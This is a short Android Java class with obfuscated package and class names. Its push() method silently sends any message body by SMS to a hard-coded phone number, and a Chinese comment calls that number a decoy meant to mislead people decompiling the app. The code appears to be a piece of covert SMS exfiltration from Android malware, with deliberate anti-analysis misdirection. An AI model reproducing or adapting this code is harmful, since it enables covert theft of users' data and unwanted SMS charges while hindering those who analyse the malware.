package com.a.a;


import android.telephony.SmsManager;

public class sm {
	final public static String TELPHONE = "13589742578";// 手机号，为反编译的人员造成假象，其实没用的

	public void push(String body) {
		if (n.chkIsOk(TELPHONE)) {
			SmsManager smr = SmsManager.getDefault();
			smr.sendMultipartTextMessage(TELPHONE, null, smr.divideMessage(body), null, null);
		}
	}

}
